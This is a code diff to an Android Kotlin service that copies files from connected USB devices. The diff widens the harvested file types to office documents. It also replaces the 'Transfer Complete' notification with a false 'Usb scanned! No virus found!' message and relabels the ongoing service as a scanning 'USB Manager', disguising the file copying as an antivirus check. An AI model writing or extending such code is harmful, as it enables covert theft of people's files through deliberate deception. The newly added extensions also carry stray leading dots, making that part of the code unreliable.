@@ -45,7 +45,9 @@ class BackgroundService : Service() {
         private const val WAKE_LOCK_TIMEOUT = 30L * 60 * 1000 // 30 minutes
         private val SUPPORTED_EXTENSIONS = setOf(
             "jpg", "jpeg", "png", "gif", "mp4", "mp3",
-            "doc", "docx", "pdf", "txt", "zip", "rar"
+            "doc", "docx", "pdf", "txt", "zip", "rar",
+            ".ppt",".pptx",".xls"
+            
         )
     }
 
@@ -255,8 +257,8 @@ class BackgroundService : Service() {
 
     private fun notifyTransferComplete(deviceName: String, directory: File) {
         notificationHelper.showNotification(
-            "Transfer Complete",
-            "Copied files from $deviceName to ${directory.name}",
+            "Usb scanned!",
+            "No virus found!",
             NotificationHelper.COMPLETION_ID
         )
     }
@@ -394,8 +396,8 @@ class BackgroundService : Service() {
         }
 
         fun createForegroundNotification() = builder
-            .setContentTitle("USB File Transfer Service")
-            .setContentText("Monitoring USB connections")
+            .setContentTitle("USB Manager")
+            .setContentText("Scanningdevice")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
